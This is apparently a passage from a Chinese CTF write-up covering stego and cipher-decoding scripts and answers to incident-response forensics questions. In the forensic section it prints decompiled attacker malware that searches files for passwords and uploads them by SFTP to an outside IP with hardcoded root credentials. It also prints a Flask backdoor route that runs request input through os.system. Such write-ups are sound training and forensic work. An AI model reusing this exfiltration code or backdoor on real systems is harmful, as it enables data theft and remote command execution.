punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>
+
+cc<span class="token operator">=</span><span class="token string">""</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> i <span class="token operator">>=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        cc<span class="token operator">+=</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        cc<span class="token operator">+=</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+        i<span class="token operator">+=</span><span class="token number">1</span>
+    i<span class="token operator">+=</span><span class="token number">1</span>
+x<span class="token operator">=</span><span class="token string">""</span>
+end<span class="token operator">=</span>cc
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ins<span class="token operator">=</span>end<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>
+    x<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ins<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>key:6470e394cbf6dab6a91682cc8585059b</p>
+</blockquote>
+<p>拿到key去解压<br>里面又套了一个伪加密<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyHMq.png" alt="OpyHMq.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpyL1c.png" alt="OpyL1c.png" loading="lazy"><br>拿到一张图片<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyEHr.png" alt="OpyEHr.png" loading="lazy"><br>还需要分离<br><img src="https://ooo.0x0.ooo/2024/04/23/OpySxG.png" alt="OpySxG.png" loading="lazy"><br>foremost又分离出来两张图片<br>提取盲水印</p>
+<blockquote>
+<p>pip install blind-watermark</p>
+</blockquote>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">import</span> cv2
+
+<span class="token keyword">from</span> blind_watermark <span class="token keyword">import</span> WaterMark
+<span class="token keyword">import</span> os
+
+bwm1 <span class="token operator">=</span> WaterMark<span class="token punctuation">(</span>password_wm<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> password_img<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token comment"># 注意需要设定水印的长宽wm_shape</span>
+bwm1<span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token string">'33.png'</span><span class="token punctuation">,</span> wm_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">)</span><span class="token punctuation">,</span> out_wm_name<span class="token operator">=</span><span class="token string">'output.png'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">)</span></code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/04/23/Opy0J1.png" alt="Opy0J1.png" loading="lazy"><br>扫码拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/23/OpycfI.png" alt="OpycfI.png" loading="lazy"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="玛卡巴卡有什么坏心思呢"><a href="#玛卡巴卡有什么坏心思呢" class="headerlink" title="玛卡巴卡有什么坏心思呢"></a>玛卡巴卡有什么坏心思呢</h2><p>解密脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">content <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">fr'玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰'</span></span>
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> ctypes<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>codecs<span class="token punctuation">,</span>base64
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode
+<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> sys
+
+
+
+encoding_rules <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡轰'</span><span class="token punctuation">,</span>    
+    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'e'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'h'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'i'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'j'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'k'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'m'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'o'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'p'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'u'</span><span class="token punctuation">:</span> <span class="token string">'哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'v'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'w'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token string">'咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'妈个巴子轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴卡轰'</span><span class="token punctuation">,</span>
+    <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴达轰'</span><span class="token punctuation">,</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">decodemaba</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    mingwen<span class="token operator">=</span><span class="token string">''</span>
+    <span class="token comment"># print(f'密文&#123;&#123;miwen&#125;&#125;')</span>
+    result <span class="token operator">=</span> re<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">r'(?&lt;=轰)'</span><span class="token punctuation">,</span> miwen<span class="token punctuation">)</span>
+    <span class="token comment"># print(result)</span>
+    <span class="token keyword">for</span> it <span class="token keyword">in</span> result<span class="token punctuation">:</span>
+        <span class="token comment"># print(it)</span>
+        <span class="token keyword">for</span> key<span class="token punctuation">,</span>val <span class="token keyword">in</span> encoding_rules<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># print(val)</span>
+            <span class="token keyword">if</span> it<span class="token operator">==</span>val<span class="token punctuation">:</span>
+                <span class="token comment"># print("找到明文密码")</span>
+                <span class="token comment"># print(key)</span>
+                mingwen <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> mingwen
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>decodemaba<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token operator">//</span>jinitaimei</code></pre>
+<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h3 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h3><blockquote>
+<p>找到JumpServer堡垒机中flag标签的值</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpN6VL.png" alt="OpN6VL.png" loading="lazy"><br><code>[BrYeaVj54009rDIZzu4O]</code></p>
+<h3 id="应急响应-2"><a href="#应急响应-2" class="headerlink" title="应急响应-2"></a>应急响应-2</h3><blockquote>
+<p>提交攻击者第一次登录时间</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNXqi.png" alt="OpNXqi.png" loading="lazy"><br>[2024&#x2F;04&#x2F;11&#x2F;14:21:18]</p>
+<h3 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h3><blockquote>
+<p>提交攻击者源IP</p>
+</blockquote>
+<p>[192.168.1.4]</p>
+<h3 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h3><blockquote>
+<p>提交攻者使用的cve编号</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNurX.png" alt="OpNurX.png" loading="lazy"><br><code>[CVE-2024-29201]</code></p>
+<h3 id="应急响应-5"><a href="#应急响应-5" class="headerlink" title="应急响应-5"></a>应急响应-5</h3><blockquote>
+<p>提交攻击者留在Web服务器上的恶意程序的32位小写md5值</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNwij.png" alt="OpNwij.png" loading="lazy"><br>这几个试了以下发下home是恶意程序<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN3Cx.png" alt="OpN3Cx.png" loading="lazy"><br><code>[84413332e4e7138adc5d6f1f688ddd69]</code></p>
+<h3 id="应急响应-6"><a href="#应急响应-6" class="headerlink" title="应急响应-6"></a>应急响应-6</h3><blockquote>
+<p>分析恶意程序连接地址和密码</p>
+</blockquote>
+<p>把&#x2F;root&#x2F;home导出然后解包可以拿到</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># visit https://tool.lu/pyc/ for more information</span>
+<span class="token comment"># Version: Python 3.10</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> paramiko
+<span class="token keyword">from</span> getpass <span class="token keyword">import</span> getpass
+
+<span class="token keyword">def</span> <span class="token function">search_in_files</span><span class="token punctuation">(</span>directory<span class="token punctuation">,</span> search_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+<span class="token comment"># WARNING: Decompyle incomplete</span>
+
+
+<span class="token keyword">def</span> <span class="token function">ssh</span><span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> remote_file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    hostname <span class="token operator">=</span> <span class="token string">'82.157.238.111'</span>
+    port <span class="token operator">=</span> <span class="token number">22</span>
+    username <span class="token operator">=</span> <span class="token string">'root'</span>
+    password <span class="token operator">=</span> <span class="token string">'1qaz@WSX3edc'</span>
+    client <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    client<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+    sftp <span class="token operator">=</span> client<span class="token punctuation">.</span>open_sftp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sftp<span class="token punctuation">.</span>put<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> remote_file_path<span class="token punctuation">)</span>
+    sftp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''File </span><span class="token interpolation"><span class="token punctuation">&#123;</span>local_file_path<span class="token punctuation">&#125;</span></span><span class="token string"> uploaded to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>remote_file_path<span class="token punctuation">&#125;</span></span><span class="token string"> on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">'''</span></span><span class="token punctuation">)</span>
+
+search_directory <span class="token operator">=</span> <span class="token string">'/'</span>
+search_for_text <span class="token operator">=</span> <span class="token string">'passwod'</span>
+<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span> search_in_files<span class="token punctuation">(</span>search_directory<span class="token punctuation">,</span> search_for_text<span class="token punctuation">)</span>
+ssh<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
+</code></pre>
+<p>外链地址82.157.238.111 密码 1qaz@WSX3edc<br><code>[e695461c231aee4ed46b201efca18ff8-7da188c2e2d83e38b7d9e75e500f1af8]</code></p>
+<h3 id="应急响应-7"><a href="#应急响应-7" class="headerlink" title="应急响应-7"></a>应急响应-7</h3><blockquote>
+<p>提交存在反序列化漏洞的端口</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNwij.png" alt="OpNwij.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/04/22/OpeM4p.png" alt="OpeM4p.png" loading="lazy"><br><code>[8080]</code></p>
+<h3 id="应急响应-8"><a href="#应急响应-8" class="headerlink" title="应急响应-8"></a>应急响应-8</h3><blockquote>
+<p>提交攻击者使用的后门路由地址</p>
+</blockquote>
+<pre class="language-python" data-language="python"><code class="language-python">$ cat app<span class="token punctuation">.</span>py
+
+
+cat app<span class="token punctuation">.</span>py 
+
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
+
+<span class="token keyword">from</span> Database <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token keyword">import</span> os
+
+<span class="token keyword">import</span> time
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/getinfo'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'Get'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    sql<span class="token operator">=</span><span class="token string">"select * from `user`"</span>
+
+    data <span class="token operator">=</span> consql<span class="token punctuation">(</span>sql<span class="token operator">=</span>sql<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+    response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>
+
+        <span class="token string">'data'</span><span class="token punctuation">:</span> data
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/system'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token comment"># print(os.system("dir"))</span>
+
+    systemdata <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span>
+
+    data <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>systemdata<span class="token punctuation">)</span>
+
+    <span class="token comment"># data = subprocess.run(systemdata)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+    <span class="token comment"># 把data的数据存储到log.txt</span>
+
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flask/log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"-----"</span> <span class="token operator">+</span>systemdata<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+
+    response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>
+
+        <span class="token string">'data'</span><span class="token punctuation">:</span> data
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></code></pre>
+<p>后门路由<code>/api/system</code><br><code>[948c4425bad48511fd6281d345ee69a1]</code></p>
+<h3 id="应急响应-9"><a href="#应急响应-9" class="headerlink" title="应急响应-9"></a>应急响应-9</h3><blockquote>
+<p>提交dnslog反弹域名</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeO6U.png" alt="OpeO6U.png" loading="lazy"><br><code>[86fedf00e173a0d531be569028fc1f6e]</code></p>
+<h3 id="应急响应-10"><a href="#应急响应-10" class="headerlink" title="应急响应-10"></a>应急响应-10</h3><blockquote>
+<p>提交第一次扫描器使用时间</p>
+</blockquote>
+<p>不懂</p>
+<h3 id="应急响应-11"><a href="#应急响应-11" class="headerlink" title="应急响应-11"></a>应急响应-11</h3><blockquote>
+<p>提交攻击者反弹shell使用的语言<br><img src="https://ooo.0x0.ooo/2024/04/22/OpeobY.png" alt="OpeobY.png" loading="lazy"><br>python<br><code>[23eeeb4347bdd26bfc6b7ee9a3b755dd]</code></p>
+</blockquote>
+<h3 id="应急响应-12"><a href="#应急响应-12" class="headerlink" title="应急响应-12"></a>应急响应-12</h3><blockquote>
+<p>提交攻击者反弹shell的ip</p>
+</blockquote>
+<p>[82.157.238.174]</p>
+<h3 id="应急响应-13"><a href="#应急响应-13" class="headerlink" title="应急响应-13"></a>应急响应-13</h3><blockquote>
+<p>提交攻击者留下的账号</p>
+</blockquote>
+<p><img src="https://ooo.0x0.ooo/2024/04/22/Ope5Yq.png" alt="Ope5Yq.png" loading="lazy"><br>[palu.com]</p>
+<h3 id="应急响应-14"><a href="#应急响应-14" class="headerlink" title="应急响应-14"></a>应急响应-14</h3><blockquote>
+<p>提交攻击者的后门账户密码</p>
+</blockquote>
